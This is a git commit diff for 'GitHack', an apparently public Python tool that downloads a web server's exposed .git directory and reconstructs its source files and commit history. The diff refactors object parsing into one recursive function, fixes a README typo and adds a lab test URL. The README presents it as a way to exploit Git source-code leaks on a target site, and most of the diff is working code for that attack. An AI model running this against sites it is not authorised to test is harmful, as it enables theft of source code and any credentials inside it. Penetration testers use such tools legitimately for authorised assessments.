0a6f4892d7c180d9691d885a615ca7a284684d7f
hazzel-cn <396960639@qq.com>
2019-04-21 20:50:51 -0700

    [*] DFS for githack.py

--- README.md
+++ README.md
@@ -11,7 +11,7 @@ cd GitHack
 // For githack.py, it collects all files classified by commits so that you can go through all files.
 python3 githack.py http://you.target/.git/
 
-// For gitclone.py, it clone the whole repository, which allows you to execute git commands.
+// For gitclone.py, it clones the whole repository, which allows you to execute git commands.
 python3 gitclone.py http://you.target/.git/
 ```
 
@@ -20,3 +20,8 @@ python3 gitclone.py http://you.target/.git/
 Without installing git, you can exploit a Git source code leak.
 
 More details can be found in [https://www.hazzel.cn/2019/04/20/a-new-githack-script/](https://www.hazzel.cn/2019/04/20/a-new-githack-script/)
+
+
+### Update log
+
+2019-4-21 Improve recursion implementation (BFS) and fix some bugs.
--- githack.py
+++ githack.py
@@ -52,7 +52,7 @@ class GitHacker:
         try:
             return urllib.request.urlopen(self.request, timeout=10)
         except Exception as e:
-            print(e)
+            print(e, url)
             exit(-1)
 
     def get_head_hash(self):
@@ -68,94 +68,85 @@ class GitHacker:
         head_url = '{base_url}{head_file}'.format(base_url=self.base_url, head_file=head_file)
         head_hash = self._request(head_url).read().strip().decode()
 
-        print('[+] Starting at commit {}'.format(head_hash))
+        print('[+] Starting at commit {}'.format(head_hash[-6:]))
         if not os.path.exists(self.workpath):
             os.mkdir(self.workpath)
         return head_hash
 
-    def analyze_blob_hash(self, name: str, blob_hash: str, commit_hash: str):
+    def analyze_object(self, current_hash, commit_hash=None, tree_hash=None, file_name=None):
         """
-        Analyze blob with the given hash
-        :param name:
-        :param blob_hash:
+        When a hash is given, request for the relevant object, decode it and parse it.
+        If it is a commit, retrieve the tree and the parent node hashes, and call the
+        method to analyze the tree and the parent nodes.
+        If it is a tree, retrieve the blob hashes, download the relevant object and
+        decode it and save it into the related folder.
+        :param current_hash:
         :param commit_hash:
-        :return:
-        """
-        print('[+] Analyzing blob {} -> {}'.format(commit_hash, blob_hash))
-
-        file_name = '{workspace}/commit_{hash_str}/{name}'.format(workspace=self.workpath, hash_str=commit_hash,
-                                                                  name=name)
-        url = '{base_url}objects/{di}/{fi}'.format(base_url=self.base_url, di=blob_hash[:2], fi=blob_hash[2:])
-        data = self._request(url).read()
-        data = zlib.decompress(data)
-
-        if data[:4] == b'blob':
-            data = re.sub(r'blob \d+\00', '', data.decode())
-            with open(file_name, 'wb') as fp:
-                fp.write(data.encode())
-
-    def analyze_tree_hash(self, tree_hash: str, commit_hash: str):
-        """
-        Analyze tree with the given hash. It has been confirmed to be a tree node hash.
-        :param tree_hash:
-        :param commit_hash:
-        :return:
-        """
-        print('[+] Analyzing tree {} -> {}'.format(commit_hash, tree_hash))
-
-        url = '{base_url}objects/{di}/{fi}'.format(base_url=self.base_url, di=tree_hash[:2], fi=tree_hash[2:])
-        data = self._request(url).read()
-        data = zlib.decompress(data)
-
-        # Parse the data and extract blob hash, then call analyze_blob_hash().
-        if data[:4] == b'tree':
-            split_tree = data.split('100644 '.encode())
-            for i in range(1, len(split_tree)):
-                t_name, hash_str = split_tree[i].split(b'\x00')
-                t_name = t_name.decode()
-                hash_str = binascii.b2a_hex(hash_str).decode()
-
-                self.analyze_blob_hash(t_name, hash_str, commit_hash)
-
-    def analyze_commit_hash(self, hash_str: str):
-        """
-        Analyze commit with the given hash. It has been confirmed the hash belongs to a commit node.
-        Create a folder for the files involved in this commit.
-        Find tree hashes and parent hashes in the data.
-        :param hash_str:
+        :param file_name:
         :return:
         """
         # request
-        url = '{base_url}objects/{di}/{fi}'.format(base_url=self.base_url, di=hash_str[:2], fi=hash_str[2:])
+        url = '{base_url}objects/{di}/{fi}'.format(base_url=self.base_url, di=current_hash[:2], fi=current_hash[2:])
         data = self._request(url).read()
         data = zlib.decompress(data)
 
         # commit
         if data[:6] == b'commit':
+            print('[+] Analyze {} '.format(current_hash[-6:]))
+
             # create commit folder and save commit message.
-            folder_name: str = '{workspace}/commit_{hash_str}'.format(workspace=self.workpath, hash_str=hash_str)
-            if not os.path.exists(folder_name):
-                os.mkdir(folder_name)
-            with open('{folder}/commit_info_{hash_str}.txt'.format(folder=folder_name, hash_str=hash_str), 'w') as fp:
+            commit_hash = current_hash
+            commit_folder: str = '{workpath}/commit_{hash_str}'.format(workpath=self.workpath, hash_str=current_hash[-6:])
+            if not os.path.exists(commit_folder):
+                os.mkdir(commit_folder)
+            with open('{folder}/commit_info_{hash_str}.txt'.format(folder=commit_folder, hash_str=current_hash[-6:]),
+                      'w') as fp:
                 fp.write(data.decode())
 
+            # find tree and its parent
             # read commit - tree
             if data.find(b'tree') != -1:
                 tree_hash_idx = data.find(b'tree') + 5
                 tree_hash_str = data[tree_hash_idx: tree_hash_idx + 40].decode()
-                self.analyze_tree_hash(tree_hash_str, hash_str)
+                self.analyze_object(current_hash=tree_hash_str, tree_hash=tree_hash_str, commit_hash=commit_hash)
 
             # read commit - parent (another commit. recursion here.)
             if data.find(b'parent') != -1:
                 parent_hash_idx = data.find(b'parent') + 7
                 parent_hash_str = data[parent_hash_idx: parent_hash_idx + 40].decode()
-                self.analyze_commit_hash(parent_hash_str)
+                self.analyze_object(current_hash=parent_hash_str)
+
+        elif data[:4] == b'tree':
+            print('[+] Analyze {} -> {}'.format(commit_hash[-6:], tree_hash[-6:]))
+
+            # parse tree object and retrieve file names + file hashes
+            split_tree = data.split('100644 '.encode())
+
+            # for each file object, analyze it.
+            for i in range(1, len(split_tree)):
+                pivot_idx = split_tree[i].find(b'\x00')
+                f_name = split_tree[i][:pivot_idx]
+                hash_str = split_tree[i][pivot_idx+1:]
+                f_name = f_name.decode()
+                hash_str = binascii.b2a_hex(hash_str).decode()
+
+                self.analyze_object(current_hash=hash_str, commit_hash=commit_hash, tree_hash=current_hash, file_name=f_name)
+
+        elif data[:4] == b'blob':
+            print('[+] Analyze {} -> {} -> {}'.format(commit_hash[-6:], tree_hash[-6:], current_hash[-6:]))
+
+            # specify the file path and write data to the new file.
+            commit_folder: str = '{workpath}/commit_{hash_str}'.format(workpath=self.workpath, hash_str=commit_hash[-6:])
+            data = re.sub(r'blob \d+\00', '', data.decode())
+            with open('{folder}/{file}'.format(folder=commit_folder, file=file_name), 'wb') as fp:
+                fp.write(data.encode())
+
         else:
-            print('[!] Fatal Error!')
+            print('[!] Unknown object found with hash {}'.format(current_hash))
 
     def run(self):
         commit_hash = self.get_head_hash()
-        self.analyze_commit_hash(commit_hash)
+        self.analyze_object(current_hash=commit_hash)
         print('[*] Finished. Please check the folder {}'.format(self.workpath))
 
 
@@ -165,6 +156,12 @@ def main():
         exit(0)
 
     url = sys.argv[1]
+    hacker = GitHacker(url)
+    hacker.run()
+
+
+def test():
+    url = 'http://192.168.64.2/GitHack/.git/'
     hacker = GitHacker(url)
     hacker.run()
 
